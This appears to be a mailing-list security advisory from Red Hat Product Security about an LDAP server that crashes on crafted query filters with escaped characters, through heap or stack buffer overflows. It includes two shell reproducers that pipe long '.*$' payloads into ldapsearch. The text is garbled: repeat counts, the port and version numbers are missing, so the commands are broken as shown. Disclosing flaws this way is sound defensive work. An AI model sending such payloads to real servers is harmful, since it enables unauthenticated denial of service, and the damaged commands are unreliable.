It handles many of the largest LDAP deployments in the world.  server did not properly handle characters needed to be escaped in its query filter. This could result in buffer overflows, from the heap or the stack, on larger filters.  An unauthenticated attacker could send a specially crafted LDAP request and crash the server. RCE has not been demonstrated at this time.  Red Hat would like to thank Greg Kubok for alerting us of the issue.   Reproducer1 : [root@...ver1 ~]# payload=$(printf '.*$%.0s' [root@...ver1 ~]# ldapsearch -h localhost -p -x -b "dc=blah" "(&(|(telephoneNumber=*${payload}*)(uid=*${payload}*)(title=*${payload}*)(sn=*${payload}*)(ou=*${payload}*)(givenName=*${payload}*))(objectClass=posixaccount))" "telephoneNumber sshpubkeyfp ipaSshPubKey uid krbCanonicalName title loginShell uidNumber gidNumber sn homeDirectory mail krbPrincipalName givenName nsAccountLock"  Reproducer2: [root@...ver1 ~]# perl -e 'print ".*\$" x | ldapsearch -x -f- "(&(uid=%s)(objectClass=posixaccount))"   Patch attached for versions &  Thanks!  --  Cedric Buissart, Product Security   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.
